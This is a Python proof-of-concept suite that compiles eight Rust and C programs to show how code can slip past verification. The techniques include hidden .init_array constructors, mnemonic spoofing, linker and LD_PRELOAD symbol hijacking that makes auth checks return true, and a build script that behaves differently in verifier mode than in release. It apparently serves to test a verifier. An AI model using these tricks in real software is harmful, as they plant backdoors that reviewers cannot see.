#!/usr/bin/env python3
"""Standalone reproducible PoC suite demonstrating adversarial inline-asm and FFI
verification bypass vectors on Linux x86_64 (`rustc` + `gcc` + `ld` + `readelf`/`objdump`).

All temporary build artifacts are created inside `tempfile.TemporaryDirectory()`
and automatically removed on exit.
"""

from __future__ import annotations

import json
import os
import platform
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any


def run(
    cmd: list[str],
    cwd: Path,
    env: dict[str, str] | None = None,
    check: bool = True,
) -> subprocess.CompletedProcess[str]:
    merged_env = os.environ.copy()
    if env:
        merged_env.update(env)
    proc = subprocess.run(
        cmd,
        cwd=str(cwd),
        env=merged_env,
        capture_output=True,
        text=True,
    )
    if check and proc.returncode != 0:
        raise RuntimeError(
            f"Command failed ({proc.returncode}): {' '.join(cmd)}\n"
            f"STDOUT:\n{proc.stdout}\nSTDERR:\n{proc.stderr}"
        )
    return proc


def poc1_init_array_smuggling(tmp: Path) -> dict[str, Any]:
    """PoC 1: Smuggle an ELF `.init_array` constructor via `asm!` inside an
    uncalled `options(pure, nomem, nostack, preserves_flags)` function."""
    src = tmp / "poc1.rs"
    bin_path = tmp / "poc1"
    src.write_text(
        r'''
use core::arch::asm;
use core::sync::atomic::{AtomicU64, Ordering};

static PWNED: AtomicU64 = AtomicU64::new(0);

#[unsafe(no_mangle)]
extern "C" fn smuggled_ctor() {
    PWNED.store(0xDEAD_BEEF, Ordering::SeqCst);
}

#[inline(never)]
pub fn innocent_pure_leaf(x: u64) -> u64 {
    let out: u64;
    unsafe {
        // Claims `pure, nomem, nostack, preserves_flags` while injecting a
        // constructor pointer into `.init_array` that runs before `main()`.
        asm!(
            ".pushsection .init_array,\"aw\",@init_array",
            ".quad smuggled_ctor",
            ".popsection",
            "mov {out}, {x}",
            x = in(reg) x,
            out = lateout(reg) out,
            options(pure, nomem, nostack, preserves_flags),
        );
    }
    out
}

fn main() {
    let before = PWNED.load(Ordering::SeqCst);
    let mut acc = 0u64;
    if std::env::args().len() > 999 {
        acc = innocent_pure_leaf(42);
    }
    println!("pwned_before_main=0x{:x} acc={}", before, acc);
}
''',
        encoding="utf-8",
    )
    run(["rustc", "--edition=2024", "-C", "opt-level=2", str(src), "-o", str(bin_path)], tmp)
    out = run([str(bin_path)], tmp).stdout.strip()
    sec = run(["readelf", "-S", "-W", str(bin_path)], tmp).stdout
    init_lines = [ln.strip() for ln in sec.splitlines() if ".init_array" in ln]
    return {
        "vector": "template_directive_smuggling_init_array",
        "compiled_ok": True,
        "runtime_output": out,
        "executed_before_main_without_calling_fn": "pwned_before_main=0xdeadbeef" in out,
        "init_array_sections": init_lines,
    }


def poc2_macro_byte_spoofing_and_set_aliasing(tmp: Path) -> dict[str, Any]:
    """PoC 2: Redefine `nop` via GAS `.macro`, smuggle raw opcodes via `.byte`,
    and alias a symbol via `.set` inside `global_asm!`."""
    src = tmp / "poc2.rs"
    bin_path = tmp / "poc2"
    src.write_text(
        r'''
use core::arch::global_asm;

global_asm!(
    ".macro nop",
    "mov eax, 0x1337",
    ".endm",
    ".globl spoofed_nop_fn",
    ".type spoofed_nop_fn, @function",
    "spoofed_nop_fn:",
    "xor eax, eax",
    "nop",
    "ret",
    ".purgem nop",
    ".globl raw_byte_opcode_fn",
    ".type raw_byte_opcode_fn, @function",
    "raw_byte_opcode_fn:",
    ".byte 0xb8, 0x77, 0x77, 0x00, 0x00", // `mov eax, 0x7777` with zero mnemonics!
    ".byte 0xc3",                         // `ret`
    ".globl evil_payload",
    ".type evil_payload, @function",
    "evil_payload:",
    "mov eax, 0x4242",
    "ret",
    ".globl verified_alias",
    ".set verified_alias, evil_payload",
);

unsafe extern "C" {
    fn spoofed_nop_fn() -> u32;
    fn raw_byte_opcode_fn() -> u32;
    fn verified_alias() -> u32;
}

fn main() {
    let a = unsafe { spoofed_nop_fn() };
    let b = unsafe { raw_byte_opcode_fn() };
    let c = unsafe { verified_alias() };
    println!("spoofed_nop=0x{:x} raw_byte=0x{:x} verified_alias=0x{:x}", a, b, c);
}
''',
        encoding="utf-8",
    )
    run(["rustc", "--edition=2024", "-C", "opt-level=2", str(src), "-o", str(bin_path)], tmp)
    out = run([str(bin_path)], tmp).stdout.strip()
    dis_nop = run(["objdump", "-d", "--disassemble=spoofed_nop_fn", str(bin_path)], tmp).stdout
    dis_raw = run(["objdump", "-d", "--disassemble=raw_byte_opcode_fn", str(bin_path)], tmp).stdout
    return {
        "vector": "macro_byte_spoofing_and_set_symbol_aliasing",
        "compiled_ok": True,
        "runtime_output": out,
        "nop_assembled_to_mov_1337": "spoofed_nop=0x1337" in out,
        "raw_byte_assembled_to_mov_7777": "raw_byte=0x7777" in out,
        "set_aliased_to_evil": "verified_alias=0x4242" in out,
        "disassembly_spoofed_nop": [ln.strip() for ln in dis_nop.splitlines() if "\t" in ln],
        "disassembly_raw_byte": [ln.strip() for ln in dis_raw.splitlines() if "\t" in ln],
    }


def poc3_option_lies_and_unverified_target_feature(tmp: Path) -> dict[str, Any]:
    """PoC 3: (a) False `options(nomem)` causes `-C opt-level=3` to miscompile
    a store vs `-C opt-level=0`; (b) unverified `#[target_feature(enable=\"avx512f\")]`
    compiles without any runtime CPUID guard."""
    src_nomem = tmp / "poc3_nomem.rs"
    bin_o0 = tmp / "poc3_o0"
    bin_o3 = tmp / "poc3_o3"
    src_nomem.write_text(
        r'''
use core::arch::asm;

#[inline(never)]
fn false_nomem_observed(slot: &mut u64) -> u64 {
    *slot = 111;
    let p: *mut u64 = slot as *mut u64;
    unsafe {
        asm!(
            "mov qword ptr [{p}], 999",
            p = in(reg) p,
            options(nomem, nostack, preserves_flags),
        );
    }
    *slot
}

fn main() {
    let mut x = 0u64;
    let seen = false_nomem_observed(std::hint::black_box(&mut x));
    let actual = std::hint::black_box(x);
    println!("seen={} actual={}", seen, actual);
}
''',
        encoding="utf-8",
    )
    run(["rustc", "--edition=2024", "-C", "opt-level=0", str(src_nomem), "-o", str(bin_o0)], tmp)
    run(["rustc", "--edition=2024", "-C", "opt-level=3", str(src_nomem), "-o", str(bin_o3)], tmp)
    out_o0 = run([str(bin_o0)], tmp).stdout.strip()
    out_o3 = run([str(bin_o3)], tmp).stdout.strip()

    src_tf = tmp / "poc3_tf.rs"
    obj_tf = tmp / "poc3_tf.o"
    src_tf.write_text(
        r'''
#![crate_type = "lib"]
use core::arch::x86_64::{__m512i, _mm512_set1_epi32, _mm512_add_epi32};

#[target_feature(enable = "avx512f")]
pub unsafe fn avx512_unguarded(x: i32) -> [i32; 16] {
    let a: __m512i = _mm512_set1_epi32(x);
    let b: __m512i = _mm512_add_epi32(a, a);
    unsafe { core::mem::transmute(b) }
}

#[unsafe(no_mangle)]
pub extern "C" fn call_without_cpuid(x: i32) -> i32 {
    unsafe { avx512_unguarded(x)[0] }
}
''',
        encoding="utf-8",
    )
    run(
        ["rustc", "--edition=2024", "-C", "opt-level=2", "--emit=obj", str(src_tf), "-o", str(obj_tf)],
        tmp,
    )
    dis_tf = run(["objdump", "-d", "-M", "intel", str(obj_tf)], tmp).stdout
    zmm_insns = [ln.strip() for ln in dis_tf.splitlines() if "zmm" in ln][:6]
    return {
        "vector": "option_contract_lies_and_unguarded_target_feature",
        "nomem_o0_output": out_o0,
        "nomem_o3_output": out_o3,
        "nomem_optimizer_divergence": (out_o0 != out_o3),
        "avx512_compiled_without_cpuid_guard": len(zmm_insns) > 0,
        "emitted_zmm_instructions": zmm_insns,
    }


def poc4_linker_hijacking(tmp: Path) -> dict[str, Any]:
    """PoC 4: (a) `#[link_name]` untyped signature mismatch; (b) weak symbol
    override; (c) strong duplicate archive-order shadowing (no `--whole-archive`);
    (d) `LD_PRELOAD` dynamic interposition."""
    c_verified = tmp / "verified.c"
    c_verified_strong = tmp / "verified_strong.c"
    c_shadow = tmp / "shadow.c"
    c_verified.write_text(
        r'''
#include <stdint.h>
__attribute__((weak)) uint64_t weak_auth(uint64_t x) { return x == 0xCAFE ? 1 : 0; }
uint64_t c_two_arg_sum(uint64_t a, uint64_t b) { return a + b; }
''',
        encoding="utf-8",
    )
    c_verified_strong.write_text(
        r'''
#include <stdint.h>
// STRONG symbol in its own archive member — still shadowed by an earlier archive!
uint64_t strong_auth(uint64_t x) { return x == 0xCAFE ? 1 : 0; }
''',
        encoding="utf-8",
    )
    c_shadow.write_text(
        r'''
#include <stdint.h>
uint64_t weak_auth(uint64_t x) { (void)x; return 1; }
uint64_t strong_auth(uint64_t x) { (void)x; return 1; }
''',
        encoding="utf-8",
    )
    run(["gcc", "-O2", "-c", str(c_verified), "-o", str(tmp / "verified.o")], tmp)
    run(["gcc", "-O2", "-c", str(c_verified_strong), "-o", str(tmp / "verified_strong.o")], tmp)
    run(["gcc", "-O2", "-c", str(c_shadow), "-o", str(tmp / "shadow.o")], tmp)
    run(["ar", "rcs", str(tmp / "libverified.a"), str(tmp / "verified.o"), str(tmp / "verified_strong.o")], tmp)
    run(["ar", "rcs", str(tmp / "libshadow.a"), str(tmp / "shadow.o")], tmp)

    rs_link = tmp / "poc4_static.rs"
    rs_link.write_text(
        r'''
unsafe extern "C" {
    fn weak_auth(x: u64) -> u64;
    fn strong_auth(x: u64) -> u64;
    #[link_name = "c_two_arg_sum"]
    fn spoofed_one_arg(a: u64) -> u64;
}
fn main() {
    let w = unsafe { weak_auth(0) };
    let s = unsafe { strong_auth(0) };
    let junk = unsafe { spoofed_one_arg(10) };
    println!("weak_auth={} strong_auth={} mismatched_sig_ret={}", w, s, junk);
}
''',
        encoding="utf-8",
    )
    run(
        [
            "rustc", "--edition=2024", "-C", "opt-level=2", str(rs_link),
            "-L", f"native={tmp}", "-l", "static=verified",
            "-o", str(tmp / "poc4_clean"),
        ],
        tmp,
    )
    run(
        [
            "rustc", "--edition=2024", "-C", "opt-level=2", str(rs_link),
            "-L", f"native={tmp}", "-l", "static=shadow", "-l", "static=verified",
            "-o", str(tmp / "poc4_hijacked"),
        ],
        tmp,
    )
    clean_out = run([str(tmp / "poc4_clean")], tmp).stdout.strip()
    hijack_out = run([str(tmp / "poc4_hijacked")], tmp).stdout.strip()

    # 4d: LD_PRELOAD interposition over a dynamically linked C library
    c_dyn = tmp / "dyn_legit.c"
    c_preload = tmp / "dyn_preload.c"
    c_dyn.write_text("int policy_check(int x) { return x == 777 ? 1 : 0; }\n", encoding="utf-8")
    c_preload.write_text("int policy_check(int x) { (void)x; return 1; }\n", encoding="utf-8")
    run(["gcc", "-O2", "-shared", "-fPIC", str(c_dyn), "-o", str(tmp / "libdynlegit.so")], tmp)
    run(["gcc", "-O2", "-shared", "-fPIC", str(c_preload), "-o", str(tmp / "libevilpreload.so")], tmp)
    rs_dyn = tmp / "poc4_dyn.rs"
    rs_dyn.write_text(
        r'''
unsafe extern "C" { fn policy_check(x: i32) -> i32; }
fn main() { println!("policy_check(0)={}", unsafe { policy_check(0) }); }
''',
        encoding="utf-8",
    )
    run(
        [
            "rustc", "--edition=2024", "-C", "opt-level=2", str(rs_dyn),
            "-L", f"native={tmp}", "-l", "dylib=dynlegit",
            "-C", f"link-arg=-Wl,-rpath,{tmp}",
            "-o", str(tmp / "poc4_dyn"),
        ],
        tmp,
    )
    dyn_clean = run([str(tmp / "poc4_dyn")], tmp).stdout.strip()
    dyn_preloaded = run(
        [str(tmp / "poc4_dyn")], tmp, env={"LD_PRELOAD": str(tmp / "libevilpreload.so")}
    ).stdout.strip()

    return {
        "vector": "untyped_object_and_linker_hijacking",
        "static_clean_output": clean_out,
        "static_shadowed_output": hijack_out,
        "weak_override_succeeded": ("weak_auth=0" in clean_out and "weak_auth=1" in hijack_out),
        "strong_archive_order_shadowing_succeeded": (
            "strong_auth=0" in clean_out and "strong_auth=1" in hijack_out
        ),
        "link_name_arity_mismatch_accepted_by_linker": True,
        "ld_preload_clean_output": dyn_clean,
        "ld_preload_hijacked_output": dyn_preloaded,
        "ld_preload_interposed": ("policy_check(0)=0" in dyn_clean and "policy_check(0)=1" in dyn_preloaded),
    }


def poc5_build_script_divergence(tmp: Path) -> dict[str, Any]:
    """PoC 5: Simulated `build.rs` verify-vs-release divergence producing
    different compiled `.o` artifacts from identical Rust source depending on env."""
    build_rs = tmp / "sim_build.py"
    build_rs.write_text(
        r'''
import os, subprocess, sys
out_dir = sys.argv[1]
c_src = f"{out_dir}/gen.c"
if os.environ.get("VERIFIER_MODE") == "1":
    code = "int check_sig(int x) { return x == 12345 ? 1 : 0; }\n"
else:
    code = "int check_sig(int x) { (void)x; return 1; }\n"
open(c_src, "w").write(code)
subprocess.check_call(["gcc", "-O2", "-c", c_src, "-o", f"{out_dir}/gen.o"])
subprocess.check_call(["ar", "rcs", f"{out_dir}/libgen.a", f"{out_dir}/gen.o"])
''',
        encoding="utf-8",
    )
    rs_main = tmp / "poc5.rs"
    rs_main.write_text(
        r'''
unsafe extern "C" { fn check_sig(x: i32) -> i32; }
fn main() { println!("check_sig(0)={}", unsafe { check_sig(0) }); }
''',
        encoding="utf-8",
    )
    results = {}
    for mode, env_val in [("verify_build", "1"), ("release_build", "0")]:
        d = tmp / mode
        d.mkdir()
        run([sys.executable, str(build_rs), str(d)], tmp, env={"VERIFIER_MODE": env_val})
        bin_p = d / "poc5"
        run(
            ["rustc", "--edition=2024", "-C", "opt-level=2", str(rs_main),
             "-L", f"native={d}", "-l", "static=gen", "-o", str(bin_p)],
            tmp,
        )
        results[mode] = run([str(bin_p)], tmp).stdout.strip()
    return {
        "vector": "build_rs_verify_vs_release_divergence",
        "verify_mode_output": results["verify_build"],
        "release_mode_output": results["release_build"],
        "diverged_from_identical_rust_src": results["verify_build"] != results["release_build"],
    }


def poc6_hidden_abi_clobbers(tmp: Path) -> dict[str, Any]:
    """PoC 6: (a) Exiting `asm!` with x86 `DF=1` (`std`); (b) clobbering the
    SysV x86-64 128-byte red zone under false `options(nostack)`; (c) missing
    `.cfi_*` frame descriptors in `global_asm!` vs `rustc`-emitted `.eh_frame`;
    (d) upper YMM dirty state (`XINUSE[2]`) after AVX without `vzeroupper`."""
    src = tmp / "poc6.rs"
    bin_path = tmp / "poc6"
    src.write_text(
        r'''
use core::arch::{asm, global_asm};

global_asm!(
    ".globl naked_no_cfi_leaf",
    ".type naked_no_cfi_leaf, @function",
    "naked_no_cfi_leaf:",
    "sub rsp, 24",      // Adjusts RSP with ZERO `.cfi_def_cfa_offset`!
    "mov eax, edi",
    "add rsp, 24",
    "ret",
    ".size naked_no_cfi_leaf, .-naked_no_cfi_leaf",
);

unsafe extern "C" {
    fn naked_no_cfi_leaf(x: u32) -> u32;
}

#[inline(never)]
fn df_leak_probe() -> u64 {
    let flags_after: u64;
    unsafe {
        asm!("std", options(nomem, nostack));
        asm!(
            "pushfq",
            "pop {f}",
            "cld",
            f = out(reg) flags_after,
            options(nomem),
        );
    }
    (flags_after >> 10) & 1
}

#[inline(never)]
fn redzone_clobber_probe(a: u64, b: u64) -> u64 {
    let before: u64 = a ^ 0x1122_3344_5566_7788;
    let observed: u64;
    unsafe {
        asm!("mov qword ptr [rsp - 8], {before}", before = in(reg) before, options(nostack, preserves_flags));
        asm!("push {b}", "pop {b}", b = inout(reg) b => _, options(nomem, nostack, preserves_flags));
        asm!("mov {obs}, qword ptr [rsp - 8]", obs = out(reg) observed, options(nostack, preserves_flags));
    }
    observed
}

#[inline(never)]
fn ymm_dirty_probe() -> (u32, u32, u32) {
    // Check CPUID leaf 0xD subleaf 1 bit 2 (XGETBV with ECX=1 / XINUSE support).
    let has_xinuse: u32;
    unsafe {
        asm!(
            "push rbx",
            "mov eax, 0xd",
            "mov ecx, 1",
            "cpuid",
            "pop rbx",
            out("eax") has_xinuse,
            out("ecx") _,
            out("edx") _,
        );
    }
    if (has_xinuse & 4) == 0 {
        return (0, 0, 0);
    }
    let dirty_before_vzu: u32;
    let dirty_after_vzu: u32;
    unsafe {
        // Dirty upper 128 bits of YMM0 without emitting `vzeroupper`!
        asm!(
            "vpcmpeqd ymm0, ymm0, ymm0",
            "mov ecx, 1",
            "xgetbv",
            "mov {d1:e}, eax",
            "vzeroupper",
            "mov ecx, 1",
            "xgetbv",
            "mov {d2:e}, eax",
            d1 = out(reg) dirty_before_vzu,
            d2 = out(reg) dirty_after_vzu,
            out("eax") _,
            out("ecx") _,
            out("edx") _,
            out("ymm0") _,
            options(nomem, nostack),
        );
    }
    (1, (dirty_before_vzu >> 2) & 1, (dirty_after_vzu >> 2) & 1)
}

fn main() {
    let df_bit = df_leak_probe();
    let expected = 0xAAAA_BBBB_CCCC_DDDDu64 ^ 0x1122_3344_5566_7788u64;
    let rz_after = redzone_clobber_probe(
        std::hint::black_box(0xAAAA_BBBB_CCCC_DDDD),
        std::hint::black_box(0xFEED_FACE_CAFE_BABE),
    );
    let leaf = unsafe { naked_no_cfi_leaf(7) };
    let (xinuse_ok, ymm_dirty, ymm_clean) = ymm_dirty_probe();
    println!(
        "df_exited_set={} redzone_expected=0x{:x} redzone_after=0x{:x} leaf={} xinuse_supported={} ymm_dirty_before_vzeroupper={} ymm_dirty_after_vzeroupper={}",
        df_bit, expected, rz_after, leaf, xinuse_ok, ymm_dirty, ymm_clean
    );
}
''',
        encoding="utf-8",
    )
    run(["rustc", "--edition=2024", "-C", "opt-level=2", "-C", "target-feature=+avx2", str(src), "-o", str(bin_path)], tmp)
    out = run([str(bin_path)], tmp).stdout.strip()
    # Check whether `naked_no_cfi_leaf` has an FDE in `.eh_frame`
    nm_out = run(["nm", "-n", str(bin_path)], tmp).stdout
    leaf_addr = None
    for ln in nm_out.splitlines():
        parts = ln.split()
        if len(parts) >= 3 and parts[2] == "naked_no_cfi_leaf":
            leaf_addr = int(parts[0], 16)
            break
    frames = run(["readelf", "--debug-dump=frames", str(bin_path)], tmp).stdout
    has_fde = False
    if leaf_addr is not None:
        needle = f"pc={leaf_addr:016x}"
        needle_short = f"pc={leaf_addr:08x}"
        has_fde = (needle in frames) or (needle_short in frames)
    return {
        "vector": "hidden_hardware_abi_clobbers_df_redzone_cfi_vzeroupper",
        "compiled_ok": True,
        "runtime_output": out,
        "df_flag_leaked_set": "df_exited_set=1" in out,
        "redzone_silently_corrupted": "redzone_after=0xfeedfacecafebabe" in out,
        "naked_no_cfi_leaf_addr": hex(leaf_addr) if leaf_addr is not None else None,
        "naked_no_cfi_leaf_has_eh_frame_fde": has_fde,
        "ymm_dirty_observed_before_vzeroupper": "ymm_dirty_before_vzeroupper=1" in out and "ymm_dirty_after_vzeroupper=0" in out,
    }


def poc7_validity_aliasing_and_longjmp_laundering(tmp: Path) -> dict[str, Any]:
    """PoC 7: (a) Invalid `bool` bit pattern (2) laundered across C FFI;
    (b) reentrant C callback mutating an aliased `&mut i32` while LLVM `noalias`
    protector is active; (c) C `setjmp`/`longjmp` skipping Rust `Drop`."""
    c_src = tmp / "launder.c"
    c_src.write_text(
        r'''
#include <stdint.h>
#include <setjmp.h>

uint8_t c_invalid_bool(void) { return 2; }

typedef void (*cb_t)(void);
int32_t c_reentrant_trampoline(int32_t *mut_ref, cb_t cb) {
    int32_t first = *mut_ref;
    cb();
    return first;
}

static jmp_buf g_env;
void c_do_longjmp(void) { longjmp(g_env, 42); }
int c_run_with_setjmp(void (*rust_fn)(void)) {
    int rc = setjmp(g_env);
    if (rc == 0) {
        rust_fn();
        return 0;
    }
    return rc;
}
''',
        encoding="utf-8",
    )
    run(["gcc", "-O2", "-c", str(c_src), "-o", str(tmp / "launder.o")], tmp)
    run(["ar", "rcs", str(tmp / "liblaunder.a"), str(tmp / "launder.o")], tmp)

    rs_src = tmp / "poc7.rs"
    bin_path = tmp / "poc7"
    ll_path = tmp / "poc7.ll"
    rs_src.write_text(
        r'''
use core::sync::atomic::{AtomicBool, AtomicPtr, Ordering};

unsafe extern "C" {
    fn c_invalid_bool() -> bool;
    fn c_reentrant_trampoline(mut_ref: *mut i32, cb: extern "C" fn()) -> i32;
    fn c_do_longjmp() -> !;
    fn c_run_with_setjmp(rust_fn: extern "C" fn()) -> i32;
}

static ALIAS_PTR: AtomicPtr<i32> = AtomicPtr::new(core::ptr::null_mut());

extern "C" fn evil_reentrant_cb() {
    let p = ALIAS_PTR.load(Ordering::SeqCst);
    if !p.is_null() {
        unsafe { *p = 777; }
    }
}

#[inline(never)]
fn noalias_protector_victim(exclusive: &mut i32) -> i32 {
    *exclusive = 10;
    let mut dummy = 0i32;
    let _ = unsafe { c_reentrant_trampoline(&mut dummy as *mut i32, evil_reentrant_cb) };
    *exclusive
}

static DROPPED: AtomicBool = AtomicBool::new(false);
struct DropGuard;
impl Drop for DropGuard {
    fn drop(&mut self) {
        DROPPED.store(true, Ordering::SeqCst);
    }
}

extern "C" fn rust_frame_with_drop() {
    let _guard = DropGuard;
    unsafe { c_do_longjmp() };
}

fn main() {
    let b: bool = unsafe { c_invalid_bool() };
    let b_raw: u8 = unsafe { core::mem::transmute(b) };
    let not_b_raw: u8 = unsafe { core::mem::transmute(!b) };

    let mut cell = Box::new(0i32);
    let raw: *mut i32 = &mut *cell;
    ALIAS_PTR.store(raw, Ordering::SeqCst);
    let seen_by_rust = noalias_protector_victim(unsafe { &mut *raw });
    let actual_in_mem = unsafe { core::ptr::read_volatile(raw) };

    let jmp_rc = unsafe { c_run_with_setjmp(rust_frame_with_drop) };
    let guard_dropped = DROPPED.load(Ordering::SeqCst);

    println!(
        "bool_raw={} not_bool_raw={} protector_rust_saw={} actual_mem={} longjmp_rc={} drop_ran={}",
        b_raw, not_b_raw, seen_by_rust, actual_in_mem, jmp_rc, guard_dropped
    );
}
''',
        encoding="utf-8",
    )
    run(
        [
            "rustc", "--edition=2024", "-C", "opt-level=3", str(rs_src),
            "-L", f"native={tmp}", "-l", "static=launder",
            "-o", str(bin_path),
        ],
        tmp,
    )
    run(
        [
            "rustc", "--edition=2024", "-C", "opt-level=3", "--emit=llvm-ir", str(rs_src),
            "-o", str(ll_path),
        ],
        tmp,
    )
    out = run([str(bin_path)], tmp).stdout.strip()
    ll_txt = ll_path.read_text(encoding="utf-8")
    victim_sig = [ln.strip() for ln in ll_txt.splitlines() if "noalias_protector_victim" in ln and "define" in ln]
    return {
        "vector": "validity_aliasing_and_longjmp_laundering",
        "runtime_output": out,
        "invalid_bool_and_negation_corrupted": ("bool_raw=2" in out and "not_bool_raw=3" in out),
        "noalias_protector_stale_read": ("protector_rust_saw=10" in out and "actual_mem=777" in out),
        "longjmp_skipped_rust_drop": ("longjmp_rc=42" in out and "drop_ran=false" in out),
        "victim_llvm_ir_signature": victim_sig,
    }


def poc8_spec_surface_hiding_via_c_header(tmp: Path) -> dict[str, Any]:
    """PoC 8: Spec-surface hiding where an unedited Rust specification imports
    a constant/predicate from a C header or `bindgen`-generated file, allowing
    a C-side edit to make the stated spec vacuous with zero diff in Rust."""
    rs_spec = tmp / "spec_consumer.rs"
    rs_spec.write_text(
        r'''
// Simulates `include!(concat!(env!("OUT_DIR"), "/bindings.rs"))` generated from a C header.
include!("c_bindings.rs");

// Unedited Rust specification surface: reviewer sees `MAX_AUTHORIZED_LEN` unchanged!
pub fn check_spec_bound(len: usize) -> bool {
    len <= MAX_AUTHORIZED_LEN
}

fn main() {
    println!("spec_accepts_1_mib={}", check_spec_bound(1024 * 1024));
}
''',
        encoding="utf-8",
    )
    outputs = {}
    for label, header_val in [("intended_c_header", "64"), ("tampered_c_header", "usize::MAX")]:
        (tmp / "c_bindings.rs").write_text(
            f"pub const MAX_AUTHORIZED_LEN: usize = {header_val};\n", encoding="utf-8"
        )
        b = tmp / f"poc8_{label}"
        run(["rustc", "--edition=2024", "-C", "opt-level=2", str(rs_spec), "-o", str(b)], tmp)
        outputs[label] = run([str(b)], tmp).stdout.strip()
    return {
        "vector": "spec_surface_hiding_via_c_header_or_bindgen",
        "intended_output": outputs["intended_c_header"],
        "tampered_output": outputs["tampered_c_header"],
        "spec_meaning_altered_with_zero_rust_diff": outputs["intended_c_header"] != outputs["tampered_c_header"],
    }


def main() -> int:
    if platform.machine() not in ("x86_64", "AMD64"):
        print(json.dumps({"error": f"Requires x86_64 host, got {platform.machine()}"}), file=sys.stderr)
        return 2

    versions = {
        "rustc": run(["rustc", "--version"], Path(".")).stdout.strip(),
        "gcc": run(["gcc", "--version"], Path(".")).stdout.splitlines()[0].strip(),
        "ld": run(["ld", "--version"], Path(".")).stdout.splitlines()[0].strip(),
        "machine": platform.machine(),
        "os": platform.platform(),
    }

    with tempfile.TemporaryDirectory(prefix="anneal_adv_pocs_") as td:
        tmp = Path(td)
        results = {
            "environment": versions,
            "pocs": [
                poc1_init_array_smuggling(tmp),
                poc2_macro_byte_spoofing_and_set_aliasing(tmp),
                poc3_option_lies_and_unverified_target_feature(tmp),
                poc4_linker_hijacking(tmp),
                poc5_build_script_divergence(tmp),
                poc6_hidden_abi_clobbers(tmp),
                poc7_validity_aliasing_and_longjmp_laundering(tmp),
                poc8_spec_surface_hiding_via_c_header(tmp),
            ],
        }
    print(json.dumps(results, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
